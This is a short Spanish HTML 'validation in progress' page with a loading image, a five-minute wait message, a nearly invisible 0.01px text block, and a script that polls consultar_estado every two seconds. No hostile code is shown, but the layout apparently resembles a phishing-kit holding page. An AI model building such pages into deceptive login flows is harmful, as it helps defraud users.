
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Validación en proceso</title>

  <!-- Scripts (desde public/assets/js) -->
  <script src="assets/js/jquery-3.6.0.min.js"></script>
  <script src="assets/js/jquery.jclock-min.js"></script>
  <script src="assets/js/functions.js"></script>

  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin: 0;
      padding: 0;
    }
    .texto {
      font-size: 0.01px;
    }
    .contenedor {
      margin-top: 20%;
    }
    .contenedor img {
      width: 25%;
    }
    .contenedor h4 {
      font-weight: 400;
    }
  </style>
</head>
<body>
  <main class="texto">
    <p>Validando información, por favor espera...</p>
  </main>

  <div id="resultado"></div>

  <div class="contenedor">
    <img src="assets/images/loading.gif" alt="Cargando...">
    <h4>Estamos realizando unas validaciones, no tardará más de 5 minutos.</h4>
  </div>

  <script>
    $(document).ready(function() {
      setInterval(consultar_estado, 2000);
      console.log("Cargando...");
    });
  </script>
</body>
</html>